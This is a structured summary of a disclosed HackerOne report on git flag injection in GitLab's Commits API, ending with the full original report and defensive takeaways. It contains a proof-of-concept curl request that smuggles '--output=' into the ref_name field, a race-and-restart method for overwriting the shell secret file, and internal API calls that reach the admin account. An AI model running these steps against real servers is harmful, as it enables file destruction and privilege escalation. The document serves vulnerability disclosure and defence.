# Git flag injection leading to file overwrite and potential remote code execution

## Metadata
- **Source:** HackerOne
- **Report:** 653125 | https://hackerone.com/reports/653125
- **Submitted:** 2019-07-22
- **Reporter:** vakzz
- **Program:** GitLab
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Command Injection, Argument Injection, Improper Input Validation, Arbitrary File Write, Privilege Escalation
- **CVEs:** None
- **Category:** memory-binary

## Summary
The Commits API endpoint fails to sanitize the ref_name parameter, allowing attackers to inject git command flags like --output= that cause arbitrary file truncation and overwrite. By crafting malicious ref_name values, an attacker can replace critical files with commit data, potentially leading to privilege escalation through secret file manipulation and unauthorized API access.

## Attack scenario
1. Attacker identifies the Commits API endpoint accepts a ref_name parameter used in git log commands
2. Attacker crafts a malicious ref_name containing git flags, e.g., '--output=/var/opt/gitlab/gitlab-rails/etc/gitlab_shell_secret'
3. Attacker sends API request with crafted ref_name, causing gitlab to execute git log with injected flag
4. Git command writes commit hash to the target file, overwriting the original gitlab_shell_secret file content
5. Attacker spams multiple concurrent requests and triggers server restart to ensure file remains with commit data
6. Attacker uses extracted or predictable secret_token value to authenticate to internal API and gain administrative access

## Root cause
The ref_name parameter from user input is passed directly to git command execution in find_commits.go without proper sanitization or escaping. Git interprets flags starting with -- as options rather than ref names, allowing arbitrary flag injection.

## Attacker mindset
An attacker would recognize that web APIs often pass user parameters to command-line tools without proper validation. By understanding git's flag syntax, they could inject options to redirect output or modify behavior. The attacker demonstrates lateral thinking by combining file truncation with service restart timing to achieve persistence and privilege escalation.

## Defensive takeaways
- Always validate and sanitize user input before passing to command-line tools, especially git commands
- Use explicit argument delimiters (e.g., '--') to separate options from positional arguments in git commands
- Implement allowlists for ref_name values rather than blacklists to prevent bypass techniques
- Use parameterized git library APIs instead of shell command execution when possible
- Apply principle of least privilege to git process user to limit file write scope
- Implement strict file permissions on sensitive configuration files like gitlab_shell_secret
- Add input validation for parameters that appear in command-line contexts
- Monitor file modification on critical system files for unexpected changes
- Use secure secret comparison even for empty/null values to prevent timing-based attacks

## Variant hunting
Check other API endpoints that construct git commands with user input (e.g., repository API, branch API)
Search for other uses of git command execution without proper argument escaping throughout codebase
Test other command-line tool integrations for similar argument injection vulnerabilities
Investigate if other git flags could be exploited for information disclosure or RCE (e.g., --format, -C)
Check if similar injection patterns exist in mercurial, svn, or other VCS integrations
Review other Gitaly services that execute git commands with external parameters

## MITRE ATT&CK
- T1190
- T1203
- T1059
- T1078
- T1548
- T1105
- T1491

## Notes
This is a critical vulnerability combining command injection with file system manipulation for privilege escalation. The attacker's insight to combine race conditions with server restart timing demonstrates sophisticated exploitation. The vulnerability chain: input validation bypass → file truncation → secret exposure → internal API access → privilege escalation is particularly dangerous. GitLab addressed this by implementing proper argument escaping and ref validation in subsequent versions.

## Full report
<details><summary>Expand</summary>

### Summary
The `ref_name` in the Commits API is not sanitized, allowing for a ref starting with `--` to be provided causing git to interpret it as a flag instead of as a ref.

If a `ref_name` such as `--output=/tmp/some_file` is used then the following command is executed by gitaly in `find_commits.go`:

`/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git log --format=format:%H --max-count=20 --follow --output=/tmp/some_file -- .`

followed by

`/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git rev-list --count --output=/tmp/some_file -- .`

This first writes the list of commits to the file, but then the `rev-list` command fails but not before truncating the file.

### Steps to reproduce

1. Create a repo and add a file
2. Use the commit api and pass in a `ref_name` such as `--output=/tmp/written`:

```
curl 'http://4290d4225642/api/v4/projects/5/repository/commits?path=.&ref_name=--output=/tmp/written'
```

3. See that the file has been created:

```
# ls -asl /tmp/written
0 -rw-r--r-- 1 git git 0 Jul 22 14:56 /tmp/written
```

### Impact

The bug allows for arbitrary files to be briefly replaced with a known commit (or a list) and then truncated be empty, easily causing denial of service by replacing important files.

One attack scenario I thought of would be to truncate `/var/opt/gitlab/gitlab-rails/etc/gitlab_shell_secret`, which almost worked but ended up failing due to `authenticate_by_gitlab_shell_token` checking the token with `unauthorized! unless Devise.secure_compare(secret_token, input)` which fails if either are blank.

This method could potentially still work if a large number of requests were spammed, waiting until the unicorn restarts (eg for an upgrade). So long as a `git log` happens last before the server shuts down then the file will stay with the commit and not get truncated. I was able to reproduce this with around 32 connections then restarting:

```
# gitlab-ctl restart unicorn
ok: run: unicorn: (pid 46755) 1s
root@4290d4225642:/var/opt/gitlab/gitlab-rails/etc# cat gitlab_shell_secret
████████
``

This then allows for use of the internal api:
```
curl -s 'http://4290d4225642/api/v4/internal/check?secret_token=██████████'
{"api_version":"v4","gitlab_version":"12.0.3","gitlab_rev":"08a51a9db93","redis":true}

curl -s 'http://4290d4225642/api/v4/internal/discover?secret_token=███&user_id=1'
{"id":1,"name":"Administrator","username":"root"}
```

### What is the current *bug* behavior?

The `ref_name` is not sanitized

### What is the expected *correct* behavior?

The `ref_name` should be sanitized to prevent it being used as git command flags.

#### Results of GitLab environment info

System information
System:
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.2
Redis Version:	3.2.12
Git Version:	2.21.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.0.3
Revision:	08a51a9db93
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.7
URL:		http://4290d4225642
HTTP Clone URL:	http://4290d4225642/some-group/some-project.git
SSH Clone URL:	git@4290d4225642:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	9.3.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git

## Impact

Truncating arbitrary files and potentially replacing them with known content. This can lead to denial of service, loss of important data, and potential privilege escalation.

</details>

---
*Analysed by Claude on 2026-05-11*
